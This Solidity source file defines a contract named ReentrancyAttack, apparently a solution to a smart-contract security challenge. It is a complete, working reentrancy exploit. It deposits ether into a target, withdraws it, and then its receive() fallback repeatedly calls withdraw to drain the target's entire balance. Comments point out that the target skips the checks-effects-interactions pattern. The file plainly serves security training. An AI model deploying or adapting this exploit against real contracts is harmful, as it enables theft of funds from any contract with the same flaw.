// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract ReentrancyAttack is Broadcasted {
    address s_contractAddr;
    uint256 s_amount;

    function attack(address payable reentrancyCtr_) public payable override {
        IReentrance(reentrancyCtr_).donate{value: msg.value}(address(this));
        IReentrance(reentrancyCtr_).withdraw(msg.value);
    }

    function broadcastedAttack(
        address payable reentrancyCtr_
    ) external payable override {
        // no broadcast to have the current contract as the donator
        _setContractAndAmount(reentrancyCtr_, msg.value);
        attack(reentrancyCtr_);
    }

    function _setContractAndAmount(
        address payable reentrancyCtr_,
        uint256 amount_
    ) internal {
        s_contractAddr = reentrancyCtr_;
        s_amount = amount_;
    }

    receive() external payable {
        uint256 balance = address(s_contractAddr).balance;

        if (balance > 0) {
            IReentrance(s_contractAddr).withdraw(s_amount);
        }
    }
}

interface IReentrance {
    // ! this function is not following the check-effects-interactions pattern
    // ! due that can withdraw more than the balance of the msg.sender
    function withdraw(uint _amount) external;

    function donate(address _to) external payable;
}
